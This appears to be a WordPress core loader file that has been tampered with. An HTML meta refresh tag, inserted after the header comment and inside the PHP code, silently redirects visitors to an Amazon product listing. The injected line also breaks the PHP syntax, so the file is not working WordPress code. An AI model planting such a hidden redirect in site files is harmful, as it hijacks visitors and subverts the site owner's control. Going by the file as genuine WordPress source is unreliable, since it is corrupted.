<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
<meta content='0;url=https://www.amazon.com/Endoscope-Dr-meter-Megapixels-Inspection-Smartphone/dp/B075B4F9YJ' http-equiv='refresh'/>

if ( !isset($wp_did_header) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once( dirname(__FILE__) . '/wp-load.php' );

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once( ABSPATH . WPINC . '/template-loader.php' );

}
